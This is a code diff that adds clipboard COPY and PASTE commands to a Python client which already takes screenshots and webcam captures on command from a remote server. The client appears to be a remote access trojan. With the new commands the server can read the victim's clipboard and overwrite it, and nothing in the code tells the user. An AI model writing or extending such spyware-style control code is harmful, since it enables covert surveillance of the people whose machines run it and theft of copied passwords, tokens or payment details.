@@ -10,6 +10,7 @@ from cryptography import x509
 from utils.baseclient import BaseClient
 from modules import screen
 from modules import webcam
+from modules import clipboard
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -33,6 +34,10 @@ class Client(BaseClient):
                 self.screenshot()
             case 'WEBCAM':
                 self.webcam()
+            case 'COPY':
+                self.copy()
+            case 'PASTE':
+                self.paste()
             case _:
                 logging.debug('Received unrecognized command: %s' % command)
 
@@ -85,6 +90,33 @@ class Client(BaseClient):
         else:
             logging.info('Captured webcam')
         self.write(img_data)
+
+    def copy(self) -> None:
+        """ Copy to clipboard """
+        logging.debug('Attempting to copy to clipboard')
+        data = self.read().decode()
+        try:
+            clipboard.copy(data)
+        except RuntimeError as error:
+            logging.error('Error occurred copying to clipboard: %s' % str(error))
+            self.write(b'ERROR')
+            self.write(str(error).encode())
+        else:
+            logging.info('Copied "%s" to clipboard' % data)
+            self.write(b'SUCCESS')
+
+    def paste(self) -> None:
+        """ Paste from clipboard """
+        logging.debug('Attempting to paste from clipboard')
+        try:
+            data = clipboard.paste()
+        except RuntimeError as error:
+            logging.error('Error occurred pasting from clipboard %s' % str(error))
+            self.write(b'ERROR')
+            self.write(str(error).encode())
+        else:
+            logging.info('Pasted "%s" from clipboard' % data)
+            self.write(data.encode())
 
 if __name__ == '__main__':
 
